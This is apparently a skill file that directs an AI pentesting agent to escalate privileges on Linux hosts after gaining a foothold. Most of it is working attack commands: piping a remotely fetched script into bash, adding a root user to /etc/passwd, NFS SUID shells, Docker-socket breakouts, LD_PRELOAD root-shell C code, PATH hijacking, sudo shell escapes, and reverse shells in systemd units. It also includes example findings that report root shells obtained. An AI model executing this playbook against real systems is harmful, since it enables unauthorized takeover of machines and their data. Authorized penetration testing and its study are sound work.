---
name: cypher-privesc-linux
description: Linux privilege escalation methodology covering SUID/GUID abuse, capabilities, cron/systemd timers, sudo misconfigurations, writable /etc/passwd and shadow, NFS no_root_squash, Docker breakout, kernel exploits, LD_PRELOAD, and PATH hijacking.
version: 0.1.0
finding_types: [PRIVESC_VECTOR, VULN_CANDIDATE, EXPLOIT_RESULT, SESSION, CREDENTIAL]
destructiveness: high
tags: [linux, privesc, post-exploit, enumeration]
---

# Cypher Linux Privilege Escalation Skill

Use this skill after gaining a foothold on a Linux system. Run enumeration, identify privilege escalation vectors, and execute the most promising path.

## Automated enumeration

```bash
# LinPEAS — comprehensive enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
# Alternative: linenum, linux-exploit-suggester, linuxprivchecker
# For CTF with no internet: pre-download and transfer
```

## Manual enumeration checklist

### System info
```bash
uname -a                    # Kernel version → check exploit-db for kernel exploits
cat /etc/os-release         # Distro and version
cat /proc/version           # Kernel + compiler info
lscpu                       # CPU architecture (32/64-bit)
hostname                    # Might reveal role (web01, db01, dc01)
ip a / ifconfig             # Network interfaces, other subnets
```

### User context
```bash
id                          # UID, GID, groups
sudo -l                     # Sudo permissions (NO PASSWORD? restricted commands?)
cat /etc/passwd             # All users
cat /etc/shadow             # Password hashes (if readable)
cat /etc/group              # Group memberships
find / -group <group> 2>/dev/null  # Files owned by groups we're in
```

### SUID / SGID binaries
```bash
find / -perm -u=s -type f 2>/dev/null    # SUID files
find / -perm -g=s -type f 2>/dev/null    # SGID files
# Check GTFOBins (gtfobins.github.io) for known SUID exploitation methods
# Common dangerous SUIDs: /bin/bash, /usr/bin/python, /usr/bin/perl, /usr/bin/find, /usr/bin/vim, /usr/bin/systemctl
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# Dangerous capabilities:
# cap_setuid+ep → become root
# cap_net_raw+ep → packet capture/sniffing
# cap_sys_admin+ep → mount, swapon, etc.
# cap_dac_read_search+ep → read any file
# cap_sys_ptrace+ep → ptrace other processes
```

### Sudo misconfigurations
```bash
sudo -l
# Dangerous patterns:
# (root) NOPASSWD: ALL             — trivially root
# (root) NOPASSWD: /usr/bin/find   — sudo find . -exec /bin/sh \; -quit
# (root) NOPASSWD: /usr/bin/vim    — sudo vim -c ':!/bin/sh'
# (root) NOPASSWD: /usr/bin/less   — !/bin/sh from within less
# LD_PRELOAD / env_keep            — environment variables preserved
```

### Cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l 2>/dev/null
# Check: writable cron scripts, wildcards (tar * → checkpoint action injection), PATH in cron
```

### Writable system files
```bash
# Writable /etc/passwd → add new root user
openssl passwd -1 password123
echo "root2:\$1\$...:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

# Writable /etc/shadow → replace root hash
# Writable /etc/sudoers → add NOPASSWD:ALL
# Writable /etc/ld.so.preload → preload malicious .so
```

### NFS no_root_squash
```bash
# Check exports
showmount -e <nfs-server>
cat /etc/exports
# If no_root_squash is set:
# On attacker machine as root:
mkdir /tmp/nfs
mount -t nfs <nfs-server>:/export /tmp/nfs
# Create SUID binary
cp /bin/bash /tmp/nfs/rootshell
chmod u+s /tmp/nfs/rootshell
# Execute on target (as any user): ./rootshell -p
```

### Docker breakout
```bash
# If user is in docker group
docker run -v /:/mnt -it alpine chroot /mnt /bin/sh
# Docker socket exposed
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt /bin/sh
```

### LD_PRELOAD / LD_LIBRARY_PATH
```c
// exploit.c
#include <stdlib.h>
#include <unistd.h>
void _init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -shared -fPIC -o exploit.so exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so <allowed-command>
```

### PATH hijacking
```bash
# If a cron job or SUID binary calls a command without full path
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash -p' >> /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Execute the vulnerable cron/SUID binary
```

### Writable systemd service
```bash
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null
# Modify ExecStart, add reverse shell, restart service
```

### Kernel exploits
```bash
# Check kernel version
uname -a
# Search exploit-db: searchsploit linux kernel <version>
# Dirty COW (CVE-2016-5195): Linux 2.6.22–4.8.3
# Dirty Pipe (CVE-2022-0847): Linux 5.8–5.16.11
# OverlayFS (CVE-2021-3493): Ubuntu 20.04, 5.11 kernel
# PwnKit (CVE-2021-4034): pkexec in polkit
# sudoedit (CVE-2021-3156): Baron Samedit, sudo 1.8.2–1.8.31p1, 1.9.0–1.9.5p1
```

## Evidence rules

- Save LinPEAS or manual enumeration output to `/mnt/project/recon/privesc-enum.txt`.
- Save the exact privesc command and output to `/mnt/project/exploit/privesc-proof.txt`.
- Document the vector used, why it worked, and how to remediate.
- After privesc, capture `whoami` and `id` as proof.

## Prefix examples

```text
[cypher:finding type=PRIVESC_VECTOR confidence=0.9 severity=high tags=linux,suid artifacts=/mnt/project/recon/privesc-enum.txt cleanup=none] `/usr/bin/find` has SUID bit set — exploitable via GTFOBins: `find . -exec /bin/sh -p \; -quit` gives root shell.
```

```text
[cypher:finding type=EXPLOIT_RESULT confidence=1.0 severity=critical tags=linux,privesc,kernel artifacts=/mnt/project/exploit/privesc-proof.txt cleanup=none] CVE-2023-0386 (OverlayFS) escalates from `www-data` to root on kernel 5.15.0-60. Root shell acquired.
```
